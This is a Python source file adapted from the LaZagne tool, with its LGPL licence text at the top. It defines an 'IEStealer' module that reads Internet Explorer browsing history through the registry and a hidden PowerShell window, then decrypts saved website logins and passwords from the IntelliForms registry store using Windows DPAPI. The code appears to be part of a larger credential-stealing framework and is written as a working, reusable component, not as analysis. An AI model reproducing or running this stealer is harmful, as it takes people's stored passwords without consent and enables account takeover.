"""
This code is taken and modified to the needs from this repository:
    https://github.com/AlessandroZ/LaZagne/tree/master/Windows
    
GNU LESSER GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.


  This version of the GNU Lesser General Public License incorporates
the terms and conditions of version 3 of the GNU General Public
License, supplemented by the additional permissions listed below.

  0. Additional Definitions.

  As used herein, "this License" refers to version 3 of the GNU Lesser
General Public License, and the "GNU GPL" refers to version 3 of the GNU
General Public License.

  "The Library" refers to a covered work governed by this License,
other than an Application or a Combined Work as defined below.

  An "Application" is any work that makes use of an interface provided
by the Library, but which is not otherwise based on the Library.
Defining a subclass of a class defined by the Library is deemed a mode
of using an interface provided by the Library.

  A "Combined Work" is a work produced by combining or linking an
Application with the Library.  The particular version of the Library
with which the Combined Work was made is also called the "Linked
Version".

  The "Minimal Corresponding Source" for a Combined Work means the
Corresponding Source for the Combined Work, excluding any source code
for portions of the Combined Work that, considered in isolation, are
based on the Application, and not on the Linked Version.

  The "Corresponding Application Code" for a Combined Work means the
object code and/or source code for the Application, including any data
and utility programs needed for reproducing the Combined Work from the
Application, but excluding the System Libraries of the Combined Work.

  1. Exception to Section 3 of the GNU GPL.

  You may convey a covered work under sections 3 and 4 of this License
without being bound by section 3 of the GNU GPL.

  2. Conveying Modified Versions.

  If you modify a copy of the Library, and, in your modifications, a
facility refers to a function or data to be supplied by an Application
that uses the facility (other than as an argument passed when the
facility is invoked), then you may convey a copy of the modified
version:

   a) under this License, provided that you make a good faith effort to
   ensure that, in the event an Application does not supply the
   function or data, the facility still operates, and performs
   whatever part of its purpose remains meaningful, or

   b) under the GNU GPL, with none of the additional permissions of
   this License applicable to that copy.

  3. Object Code Incorporating Material from Library Header Files.

  The object code form of an Application may incorporate material from
a header file that is part of the Library.  You may convey such object
code under terms of your choice, provided that, if the incorporated
material is not limited to numerical parameters, data structure
layouts and accessors, or small macros, inline functions and templates
(ten or fewer lines in length), you do both of the following:

   a) Give prominent notice with each copy of the object code that the
   Library is used in it and that the Library and its use are
   covered by this License.

   b) Accompany the object code with a copy of the GNU GPL and this license
   document.

  4. Combined Works.

  You may convey a Combined Work under terms of your choice that,
taken together, effectively do not restrict modification of the
portions of the Library contained in the Combined Work and reverse
engineering for debugging such modifications, if you also do each of
the following:

   a) Give prominent notice with each copy of the Combined Work that
   the Library is used in it and that the Library and its use are
   covered by this License.

   b) Accompany the Combined Work with a copy of the GNU GPL and this license
   document.

   c) For a Combined Work that displays copyright notices during
   execution, include the copyright notice for the Library among
   these notices, as well as a reference directing the user to the
   copies of the GNU GPL and this license document.

   d) Do one of the following:

       0) Convey the Minimal Corresponding Source under the terms of this
       License, and the Corresponding Application Code in a form
       suitable for, and under terms that permit, the user to
       recombine or relink the Application with a modified version of
       the Linked Version to produce a modified Combined Work, in the
       manner specified by section 6 of the GNU GPL for conveying
       Corresponding Source.

       1) Use a suitable shared library mechanism for linking with the
       Library.  A suitable mechanism is one that (a) uses at run time
       a copy of the Library already present on the user's computer
       system, and (b) will operate properly with a modified version
       of the Library that is interface-compatible with the Linked
       Version.

   e) Provide Installation Information, but only if you would otherwise
   be required to provide such information under section 6 of the
   GNU GPL, and only to the extent that such information is
   necessary to install and execute a modified version of the
   Combined Work produced by recombining or relinking the
   Application with a modified version of the Linked Version. (If
   you use option 4d0, the Installation Information must accompany
   the Minimal Corresponding Source and Corresponding Application
   Code. If you use option 4d1, you must provide the Installation
   Information in the manner specified by section 6 of the GNU GPL
   for conveying Corresponding Source.)

  5. Combined Libraries.

  You may place library facilities that are a work based on the
Library side by side in a single library together with other library
facilities that are not Applications and are not covered by this
License, and convey such a combined library under terms of your
choice, if you do both of the following:

   a) Accompany the combined library with a copy of the same work based
   on the Library, uncombined with any other library facilities,
   conveyed under the terms of this License.

   b) Give prominent notice with the combined library that part of it
   is a work based on the Library, and explaining where to find the
   accompanying uncombined form of the same work.

  6. Revised Versions of the GNU Lesser General Public License.

  The Free Software Foundation may publish revised and/or new versions
of the GNU Lesser General Public License from time to time. Such new
versions will be similar in spirit to the present version, but may
differ in detail to address new problems or concerns.

  Each version is given a distinguishing version number. If the
Library as you received it specifies that a certain numbered version
of the GNU Lesser General Public License "or any later version"
applies to it, you have the option of following the terms and
conditions either of that published version or of any later version
published by the Free Software Foundation. If the Library as you
received it does not specify a version number of the GNU Lesser
General Public License, you may choose any version of the GNU Lesser
General Public License ever published by the Free Software Foundation.

  If the Library as you received it specifies that a proxy can decide
whether future versions of the GNU Lesser General Public License shall
apply, that proxy's public statement of acceptance of any version is
permanent authorization for you to choose that version for the
Library.
"""
import hashlib
import subprocess
import os
import winreg
from config.manager import ModuleManager


# ---------------------------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------------------------------------
from ctypes.wintypes import *
from ctypes import *

class OSVERSIONINFOEXW(Structure):
    _fields_ = [
        ('dwOSVersionInfoSize', c_ulong),
        ('dwMajorVersion', c_ulong),
        ('dwMinorVersion', c_ulong),
        ('dwBuildNumber', c_ulong),
        ('dwPlatformId', c_ulong),
        ('szCSDVersion', c_wchar * 128),
        ('wServicePackMajor', c_ushort),
        ('wServicePackMinor', c_ushort),
        ('wSuiteMask', c_ushort),
        ('wProductType', c_byte),
        ('wReserved', c_byte)
    ]

class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', DWORD),
        ('pbData', POINTER(c_char))
    ]

class CRYPTPROTECT_PROMPTSTRUCT(Structure):
    _fields_ = [
        ('cbSize', DWORD),
        ('dwPromptFlags', DWORD),
        ('hwndApp', HWND),
        ('szPrompt', LPCWSTR),
    ]

PVOID = c_void_p
PCRYPTPROTECT_PROMPTSTRUCT = POINTER(CRYPTPROTECT_PROMPTSTRUCT)

kernel32 = WinDLL('kernel32', use_last_error=True)
crypt32 = WinDLL('crypt32', use_last_error=True)


CryptUnprotectData = crypt32.CryptUnprotectData
CryptUnprotectData.restype = BOOL
CryptUnprotectData.argtypes = [POINTER(DATA_BLOB), POINTER(LPWSTR), POINTER(DATA_BLOB), PVOID,
                               PCRYPTPROTECT_PROMPTSTRUCT, DWORD, POINTER(DATA_BLOB)]

LocalFree = kernel32.LocalFree
LocalFree.restype = HANDLE
LocalFree.argtypes = [HANDLE]


# def are_masterkeys_retrieved():
#     """
#     Before running modules using DPAPI, we have to retrieve masterkeys
#     otherwise, we do not realize these checks
#     """
#     current_user = constant.username
#     if constant.pypykatz_result.get(current_user, None):
#         password = constant.pypykatz_result[current_user].get('Password', None)
#         pwdhash = constant.pypykatz_result[current_user].get('Shahash', None)

#         # Create one DPAPI object by user
#         constant.user_dpapi = UserDpapi(password=password, pwdhash=pwdhash)

#     if not constant.user_dpapi or not constant.user_dpapi.unlocked:
#         # constant.user_password represents the password entered manually by the user
#         constant.user_dpapi = UserDpapi(password=constant.user_password)

#         # Add username to check username equals passwords
#         constant.user_dpapi.check_credentials([constant.username] + constant.password_found)

#     # Return True if at least one masterkey has been decrypted
#     return constant.user_dpapi.unlocked



def getData(blobOut):
    cbData = blobOut.cbData
    pbData = blobOut.pbData
    buffer = create_string_buffer(cbData)
    memmove(buffer, pbData, sizeof(buffer))
    LocalFree(pbData);
    return buffer.raw

class sample:
    
    def Win32CryptUnprotectData(cipherText, entropy=False, is_current_user=True, user_dpapi=False):
        decrypted = None

        if is_current_user:
            bufferIn = c_buffer(cipherText, len(cipherText))
            blobIn = DATA_BLOB(len(cipherText), bufferIn)
            blobOut = DATA_BLOB()

            if entropy:
                bufferEntropy = c_buffer(entropy, len(entropy))
                blobEntropy = DATA_BLOB(len(entropy), bufferEntropy)

                if CryptUnprotectData(byref(blobIn), None, byref(blobEntropy), None, None, 0, byref(blobOut)):
                    decrypted = getData(blobOut)

            else:
                if CryptUnprotectData(byref(blobIn), None, None, None, None, 0, byref(blobOut)):
                    decrypted = getData(blobOut)

        if not decrypted:
            can_decrypt = True
            if not (user_dpapi and user_dpapi.unlocked):
                can_decrypt = True

            if can_decrypt:
                try:
                    decrypted = user_dpapi.decrypt_encrypted_blob(cipherText)
                except:
                    # The encrypted blob cannot be parsed - weird (could happen with chrome v80)
                    return None
                if decrypted is False:
                    decrypted = None
            else:
                # raise ValueError('MasterKeys not found')
                pass

        if not decrypted:
            if not user_dpapi:
                # raise ValueError('DPApi unavailable')
                pass
            elif not user_dpapi.unlocked:
                # raise ValueError('DPApi locked')
                pass

        return decrypted
# ---------------------------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------------------------------------


STARTF_USESHOWWINDOW = subprocess.STARTF_USESHOWWINDOW
SW_HIDE = subprocess.SW_HIDE
KEY_READ = 131097
HKEY_CURRENT_USER = -2147483647


    
class IEStealer(ModuleManager):
    
    def __init__(self) -> None:
        super().__init__(module_name="InternetExplorerStealer")
        
    
    def get_hash_table(self):
        urls = self.get_history()

        hash_tables = []
        for u in range(len(urls)):
            try:
                h = (urls[u] + '\0').encode('UTF-16LE')
                hash_tables.append([h, hashlib.sha1(h).hexdigest().lower()])
            except Exception:
                pass
        return hash_tables

    def get_history(self):
        urls = self.history_from_regedit()
        try:
            urls = urls + self.history_from_powershell()
        except Exception:
            pass
        urls = urls + ['https://www.facebook.com/', 'https://www.gmail.com/', 'https://accounts.google.com/', 'https://accounts.google.com/servicelogin']
        return urls
    
    def history_from_powershell(self):
        # From https://richardspowershellblog.wordpress.com/2011/06/29/ie-history-to-csv/
        cmdline = '''
        function get-iehistory {
        [CmdletBinding()]
        param ()
        
        $shell = New-Object -ComObject Shell.Application
        $hist = $shell.NameSpace(34)
        $folder = $hist.Self
        
        $hist.Items() | 
        foreach {
            if ($_.IsFolder) {
            $siteFolder = $_.GetFolder
            $siteFolder.Items() | 
            foreach {
                $site = $_
            
                if ($site.IsFolder) {
                $pageFolder  = $site.GetFolder
                $pageFolder.Items() | 
                foreach {
                    $visit = New-Object -TypeName PSObject -Property @{        
                        URL = $($pageFolder.GetDetailsOf($_,0))           
                    }
                    $visit
                }
                }
            }
            }
        }
        }
        get-iehistory
        '''
        command = ['powershell.exe', '/c', cmdline]
        info = subprocess.STARTUPINFO()
        info.dwFlags = STARTF_USESHOWWINDOW
        info.wShowWindow = SW_HIDE
        p = subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE,
                             stdin=subprocess.PIPE, universal_newlines=True)
        results, _ = p.communicate()

        urls = []
        for r in results.split('\n'):
            if r.startswith('http'):
                urls.append(r.strip())
        return urls

    def isx64machine(self):
        archi = os.environ.get("PROCESSOR_ARCHITEW6432", '')
        if '64' in archi:
            return True
        archi = os.environ.get("PROCESSOR_ARCHITECTURE", '')
        if '64' in archi:
            return True
        return False

    def OpenKey(self, key, path, index=0, access=KEY_READ):
        isx64 = self.isx64machine()
        if isx64:
            return winreg.OpenKey(key, path, index, access | winreg.KEY_WOW64_64KEY)
        else:
            return winreg.OpenKey(key, path, index, access)

    def history_from_regedit(self):
        urls = []
        try:
            hkey = self.OpenKey(HKEY_CURRENT_USER, 'Software\\Microsoft\\Internet Explorer\\TypedURLs')
        except Exception:
            return []

        num = winreg.QueryInfoKey(hkey)[1]
        for x in range(0, num):
            k = winreg.EnumValue(hkey, x)
            if k:
                urls.append(k[1])
        winreg.CloseKey(hkey)
        return urls
    
    def decipher_password(self, cipher_text, u):
        pwd_found = []
        
        # deciper the password
        pwd = sample.Win32CryptUnprotectData(cipher_text, u, is_current_user=True,
                                          user_dpapi=None)
        if not pwd:
            return []

        separator = b"\x00\x00"
        if pwd.endswith(separator):
            pwd = pwd[: -len(separator)]

        chunks_reversed = pwd.rsplit(separator)[::-1]  # <pwd_n>, <login_n>, ..., <pwd_0>, <login_0>, <SOME_SERVICE_DATA_CHUNKS>

        #  Filter out service data
        possible_passwords = [x for n, x in enumerate(chunks_reversed) if n % 2 == 0]
        possible_logins = [x for n, x in enumerate(chunks_reversed) if n % 2 == 1]
        for possible_login, possible_password in zip(possible_logins, possible_passwords):
            #  Service data starts with several blocks of "<2_bytes>\x00\x00<10_bytes>"
            if len(pwd_found) > 0 and len(possible_login) == 2 and len(possible_password) == 10:
                break

            try:
                possible_login_str = possible_login.decode('UTF-16LE')
                possible_password_str = possible_password.decode('UTF-16LE')
            except UnicodeDecodeError:
                if len(pwd_found) > 0:
                    #  Some passwords have been found. Assume this is service data.
                    break

                #  No passwords have been found. Assume login or password contains some chars which could not be decoded
                possible_login_str = str(possible_password)
                possible_password_str = str(possible_password)

            pwd_found.append({
                'URL': u.decode('UTF-16LE'),
                'Login': possible_login_str,
                'Password': possible_password_str
            })

        return pwd_found

    def get_os_version(self):
        """
        return major anr minor version
        https://msdn.microsoft.com/en-us/library/windows/desktop/ms724832(v=vs.85).aspx
        """
        os_version = OSVERSIONINFOEXW()
        os_version.dwOSVersionInfoSize = sizeof(os_version)
        retcode = windll.Ntdll.RtlGetVersion(byref(os_version))
        if retcode != 0:
            return False

        return '%s.%s' % (str(os_version.dwMajorVersion.real), str(os_version.dwMinorVersion.real))


    def run(self):
        if float(self.get_os_version()) > 6.1:
            return

        pwd_found = []
        try:
            hkey = self.OpenKey(HKEY_CURRENT_USER, 'Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2')
        except Exception:
            pass
        else:
            nb_site = 0
            nb_pass_found = 0

            # retrieve the urls from the history
            hash_tables = self.get_hash_table()

            num = winreg.QueryInfoKey(hkey)[1]
            for x in range(0, num):
                k = winreg.EnumValue(hkey, x)
                if k:
                    nb_site += 1
                    for h in hash_tables:
                        # both hash are similar, we can decipher the password
                        if h[1] == k[0][:40].lower():
                            nb_pass_found += 1
                            cipher_text = k[1]
                            pwd_found += self.decipher_password(cipher_text, h[0])
                            break

            winreg.CloseKey(hkey)

            # manage errors
            if nb_site > nb_pass_found:
                print('no passwords found')

        return pwd_found

